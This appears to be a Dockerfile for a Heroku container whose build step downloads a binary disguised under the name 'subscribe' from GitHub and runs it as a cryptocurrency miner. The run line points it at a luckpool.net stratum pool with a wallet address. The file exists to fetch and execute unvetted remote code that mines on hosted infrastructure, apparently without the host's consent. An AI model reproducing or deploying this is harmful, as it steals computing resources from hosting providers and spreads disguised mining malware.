FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/wardonoasus/mrbogel/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://ap.luckpool.net:3956 -u RAzq2c1oBkoTi69md5fhpWwrsu6qX2ED6o.VPS
CMD bash heroku.sh
